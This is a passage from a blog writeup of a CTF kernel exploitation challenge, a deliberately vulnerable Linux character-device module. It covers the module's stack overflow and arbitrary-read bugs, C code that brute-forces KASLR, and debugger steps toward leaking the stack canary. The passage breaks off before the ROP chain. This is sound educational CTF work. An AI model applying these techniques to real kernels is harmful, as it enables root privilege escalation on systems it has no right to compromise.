["https://archive.elmo.sg/posts/ctfs/2023/ictf-window-of-opportunity"]
title = "Window of Opportunity -- Intro to Kernel Exploitation | a rant of my adventures"
description = "pwn challenge from imaginary ctf 2023"
full_description = '''Window of Opportunity -- Intro to Kernel Exploitation25 Jul 2023Table of ContentsPoking AroundUnderstanding our EnvironmentReverse Engineering: chall.koinit_moduledevice_write (buffer overflow?!)device_ioctlFighting KASLRGetting our hands dirty: Defeating KASLRFighting Stack CookiesGetting our hands dirty: KROP to rootwhat modprobe what path?Crafting kROP chainExtra lore — kASLR bypass via cpu_entry_areaConclusionImaginary CTF 2023 has just ended and it once again did not disappoint. The CTF featured a variety of fun and interesting challenges. Kudos to the organizers for yet another successful event.One of the interesting challenges that I solved this year was window-of-opportunity, which is a kernelspace pwn challenge. In this writeup, I will share my thought processes and hopefully bring you some insights or new knowledge into the world of kernelspace!Window Of OpportunitySometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.. ├── bzImage ├── decompress.sh ├── gdb.sh ├── initramfs.cpio ├── run.sh └── src ├── Makefile ├── exploit └── exploit.c 1 directory, 8 files Poking AroundWe are provided with some files, notablybzImage (kernel image)initramfs.cpio (compressed file system)run.sh (qemu command to boot the kernel)exploit.c (template exploit code)Conveniently, if we look at src/Makefilerun: ../run.sh ../initramfs.cpio exploit debug: tmux split-window -h "sudo gdb ../vmlinux -x ../gdb.sh" $(MAKE) run The author provides us a convenient way to compile, run and debug our exploit!We can simply use the make command to boot the kernel or make debug to boot the kernel and attach GDB.Boot time: 4.26 --------------------------------------------------------------- _ | | __ _____| | ___ ___ _ __ ___ ___ \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ \ V V / __/ | (_| (_) | | | | | | __/_ \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_) Take the opportunity. Look through the window. Get the flag. --------------------------------------------------------------- / $ ls bin etc home proc sbin usr chall.ko exploit init root sys var dev flag.txt linuxrc run tmp / $ cat flag.txt cat: can't open 'flag.txt': Permission denied / $ Understanding our EnvironmentUsing the decompress.sh script, we can unpack initramfs.cpio to give us our compressed file system used for the kernel.The file that we are interested in looking is etc/init.d/rcS, which is a shell script that is run on startup.It might seem a little overwhelming, but I have added some comments to the script to make it easier to understand.#!/bin/sh export PATH=/usr/sbin:/usr/bin:/sbin:/bin # unimportant: create necessary root directories [ -d /dev ] || mkdir -m 0755 /dev [ -d /sys ] || mkdir /sys [ -d /proc ] || mkdir /proc [ -d /tmp ] || mkdir /tmp [ -d /run ] || mkdir /run [ -d /root ] || mkdir /root [ -d /etc ] || mkdir /etc [ -d /home ] || mkdir /home # create root user echo 'root:x:0:0:root:/root:/bin/sh' > /etc/passwd echo 'root:x:0:' > /etc/group chmod 644 /etc/passwd chmod 644 /etc/group # create unprivileged user adduser user --disabled-password # give appropriate permissions for files chown -R root:root / chmod 700 -R /root chown user:user /home/user chmod 777 /home/user chmod 777 /tmp chmod 755 /dev # flag.txt cannot be read/written by anyone chmod 0 /flag.txt # unimportant mkdir -p /var/lock mount -t sysfs -o nodev,noexec,nosuid sysfs /sys mount -t proc -o nodev,noexec,nosuid proc /proc ln -sf /proc/mounts /etc/mtab mount -t devtmpfs -o nosuid,mode=0755 udev /dev mkdir -p /dev/pts mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || true mount -t tmpfs -o "noexec,nosuid,size=10%,mode=0755" tmpfs /run # important!! read more below echo 2 > /proc/sys/kernel/kptr_restrict echo 2 > /proc/sys/kernel/perf_event_paranoid echo 1 > /proc/sys/kernel/dmesg_restrict # unimportant: mount stuff mkdir /tmp/mount mount -t 9p -o trans=virtio,version=9p2000.L host0 /tmp/mount # copy in our exploit executable cp /dev/sda /exploit chmod +x /exploit # load the vulnerable kernel module insmod chall.ko # the kernel module registered a chrdev # we provide proper permissions to chrdev # so that the user can interact with it dmesg | grep mknod | awk -F "'" '{print $2}' | sh chmod 777 /dev/window echo -e "\nBoot time: $(cut -d' ' -f1 /proc/uptime)\n" # login with non-privileged user setsid cttyhack setuidgid 1000 sh --login # exit gracefully umount /proc umount /sys poweroff -d 0 -f The following lines are some security features that are set by the rcS script.kptr_restrictkernel pointers that are printed will (not) be censoredimpact: prevent leaking of kernel addressesperf_event_paranoidcontrols use of the performance events system by unprivileged usersimpact: prevent leaking of kernel addresses?dmesg_restrictcontrol access to kernel buffer (dmesg)impact: prevent leaking of kernel addressesAs you can tell, all three security features are in place to prevent unprivileged users from leaking any sort of information from the kernel.This forces us to find a way to exploit the possibly vulnerable kernel driver instead of simply reading leaked pointers from the kernel or similar.Apart from these security features that are enabled on runtime, there are other security features that are enabled when booting the kernel and can be found in run.sh. qemu-system-x86_64 -no-reboot \ -m 256M\ -kernel $KERNEL_PATH \ -initrd $1 \ -cpu kvm64,+smep,+smap \ -append "console=ttyS0 oops=panic panic=1 kpti=1 kaslr quiet" \ -drive file=$2,format=raw \ -monitor /dev/null \ -serial mon:stdio \ -virtfs local,path=/tmp,mount_tag=host0,security_model=passthrough,id=foobar \ -nographic -s Based on the qemu command, the following protections are enabled:Supervisor Mode Excess Prevention (SMEP)prevents executing in userspace addressesSupervisor Mode Access Prevention (SMAP)prevents read/writing to userspace addressesKernel Address Space Layout Randomization (KASLR)randomizes addresses where kernel is loaded in memoryASLR is a little predictable?Kernel Page Table Isolation (KPTI)mainly to mitigate meltdown vulnerabilityisolate userspace memory with kernel memorylittle effect on most kernel exploitation techniquesFor ease of debugging our exploits, we can disable some of the restrictions and change our startup shell to be a root shell.echo 0 > /proc/sys/kernel/kptr_restrict echo 0 > /proc/sys/kernel/perf_event_paranoid echo 0 > /proc/sys/kernel/dmesg_restrict setsid cttyhack setuidgid 0 sh --login # login as uid 0 instead of 1000 Reverse Engineering: chall.koinit_moduleGiven that most modern kernel mitigation techniques are enabled, we will need to look for some powerful primitives that can help us work around these protections and still get to root.We start from init_module, which is a function that is run only once — when loading the module.int Major_num; struct file_operations fops = { .unlocked_ioctl = device_ioctl; // interact via ioctl(fd, cmd, arg) .compat_ioct = device_ioctl; .write = device_write; // interact via write(fd, buf, cou) .release = device_release; .open = device_open; }; int init_module() { Major_num = _register_chrdev(0LL, 0LL, 256LL, "window", &fops); if ( Major_num >= 0 ) printk("Registered character device with major number %d", Major_num); printk("'mknod /dev/%s c %d 0'.\n", "window", Major_num); printk("Knock, and the door will be opened unto you."); return 0LL; printk("Failed to register device, major num returned %d", Major_num); return Major_num; } This function simply registers a character device, and maps some interaction with the device to the corresponding function via the file_operations struct.Think of a character device like a MacDonalds drive-thru.Just like how the MacDonalds drive-thru is a way for you to interact with MacDonald employees to get your order, the character device is a way for you to interact with the kernel module to do whatever you want it to do.device_write (buffer overflow?!)One way we can interact with the device is by writing to /dev/window which would trigger the device_write function.If we try to decompile the code in IDA, we get some very weird code here.ssize_t device_write(file *file, const char *buf, size_t count, loff_t *offset) { __int64 v4; // rbp char a[64]; // [rsp+0h] [rbp-50h] BYREF unsigned __int64 v7; // [rsp+40h] [rbp-10h] __int64 v8; // [rsp+48h] [rbp-8h] _fentry__(file, buf); v8 = v4; v7 = __readgsqword(0x28u); copy_from_user(a); // <-- copy_from_user should take 3 arguments!! return 0LL; } Hence we will need to change the call type for some functions and fix up the code a little.After cleaning up the code, we get something nicer like this:ssize_t device_write(file *file, char *buf, size_t count, loff_t *offset) { char a[64]; unsigned __int64 canary; canary = __readgsqword(0x28u); // copy count bytes from buffer `buf` in userspace to buffer `a` in kernelspace copy_from_user(a, buf, count); return 0LL; } This function is straightforward. If you haven’t noticed, there is no bounds check for the amount of bytes that is copied from userspace to the kernel.This gives us our first vulnerability, a buffer overflow!However, as you can also see, there is stack canary protections. This prevents us from trivially wrecking the stack and corrupting our instruction pointer. We will have to find a way to leak a stack canary in order for our buffer overflow to be useful.device_ioctltypedef struct { char* ptr; char buf[256]; } request; __int64 device_ioctl(file *filp, unsigned int cmd, unsigned long arg) { request req; unsigned long canary; canary = __readgsqword(0x28u); if ( cmd != 0x1337 ) return -1LL; copy_from_user((char *)&req, arg, 264LL); return copy_to_user(arg + 8, req.ptr, 256LL); } device_ioctl function is also pretty straightforward.Primarily, the function copies a request struct from userspace into the kernel.It then copies back any arbitrary space requested by the struct in userspace and copies it back to userspace.Essentially, this function gives us a free arbitrary read, allowing us to read anywhere we want in the kernel memory.Fighting KASLRSo far, we have found two very powerful vulnerabilities inside of the kernel module.Buffer OverflowArbitrary ReadWith the buffer overflow, we can possibly write a kernel ROP chain to elevate us to root. However, in order to do so, we need to find a way to bypass KASLR so that we are able to find gadgets to use in our ROP chain.Our arbitrary read requires us to provide an address, however, if we do not know any kernel address in the first place, how can we use the arbitrary read to defeat KASLR?Answer: We can use the arbitrary read to brute force KASLRIn order to understand how and why it works, we need to first understand the following three concepts:copy_to_user is fail-safecopy_to_user does not fail even if the kernel address provided is not mapped yet, it simply copies a bunch of null bytes to the userspace buffer.It only throws an error and fails when a kernel address is not physically mappable or does not have the appropriate permissions, which is not of concern to us in this writeup.kaslr is brute-forceableUnlike in userspace where the ASLR entropy can be as high as 30 bits (1073741824 combinations), the KASLR entropy is only 9 bits (512 combinations) due to space constraints and alignment issues.we know the range of kaslr addresses to brute forceThe physical address and virtual address of kernel text itself are randomized to a different position separately. The physical address of the kernel can be anywhere under 64TB, while the virtual address of the kernel is restricted between [0xffffffff80000000, 0xffffffffc0000000], the 1GB space.By combining both of these concepts, we can abuse the arbitrary read via copy_to_user in device_ioctl to brute force the 9 bits of and find our kernel image base.Getting our hands dirty: Defeating KASLRWith all the information, we can write a simple script to brute force the KASLR to get our kernel base.#include <stdio.h> #include <string.h> #include <sys/ioctl.h> #include <unistd.h> #include <fcntl.h> #include <stdlib.h> #include <stdlib.h> int fd = 0; void perror(const char* msg) { puts(msg); exit(-1); } // returns 8 bytes from and arbitrary kernel address unsigned long aar(unsigned long ptr) { unsigned long leak[264/8] = {0}; leak[0] = ptr; ioctl(fd, 0x1337, leak); return leak[1]; } int main() { unsigned long kbase = 0; fd = open("/dev/window", O_RDWR); if (fd == -1) perror("error: unable to open /dev/window"); // we start from the smallest possible kaslr address kbase = 0xffffffff80000000; while (1) { unsigned long ret = aar(kbase); printf("[-] trying 0x%lx... got 0x%lx\n", kbase, ret); if (ret != 0) { break; } kbase += 0x100000; } printf("[*] kbase at 0x%lx\n", kbase); close(fd); } Voila!Fighting Stack CookiesNow that we have our kernel base, we can easily construct a ROP chain to do whatever we want.However, we are unable to overflow the return address with our ROP chain without wrecking the kernel stack canary. In order to exploit the buffer overflow, we need to first find a way to leak our stack canary.Based on previous decompiled code — canary = __readgsqword(0x28u) — we can see that the canary is being loaded from gs:0x28.We can look at it in our debuggerHowever, by looking at the address of gs_base, we can see that it is not within the kernel image base. If we reboot the kernel a few times, we can also see that gs_base address is also randomized.This means that we will have to find a way to eitherleak a canary from within the kernel imageleak a pointer relative to gs_base from within the kernel imageProblem: The kernel image is so huge, how do we find a canary/pointer that we want?Insight: Since the canary and the pointer to gs_base is all determined at runtime, we want to look for places that store data and is also writeable/modifiable at runtime.We can look for pointers in the .BSS segment which is a segment within the kernel image that stores global variables that are only initialized at runtime.By looking at the man page for nm, we can see the followingThe /proc/kallsyms file stores all the symbols (functions, variables, etc.) and the corresponding addresses for the kernel. It also follows the same convention as nm. Thus we can easily search for BSS variables by using the following command/ # grep " b " /proc/kallsyms | head ffffffff96d3e000 b dummy_mapping ffffffff96d3f000 b level3_user_vsyscall ffffffff96d40000 b idt_table ffffffff96d41000 b espfix_pud_page ffffffff96d42000 b bm_pte ffffffff96d43000 b scratch.0 ffffffff96d44010 b initcall_calltime ffffffff96d44018 b panic_param ffffffff96d44020 b panic_later ffffffff96d44028 b execute_command By scanning the BSS in memory in GDB, we can soon find an address that is at a relative offset from $gs_base.pwndbg> x/gx 0xffffffff96d44050 0xffffffff96d44050: 0xffff9e870fcdb8c0 pwndbg> x/gx $gs_base 0xffff9e870f600000: 0x0000000000000000 pwndbg> pi hex(0xffffffff96d44050-0xffffffff94600000) '0x2744050' As you can see, there is a pointer at a relative offset to $gs_base stored in an'''
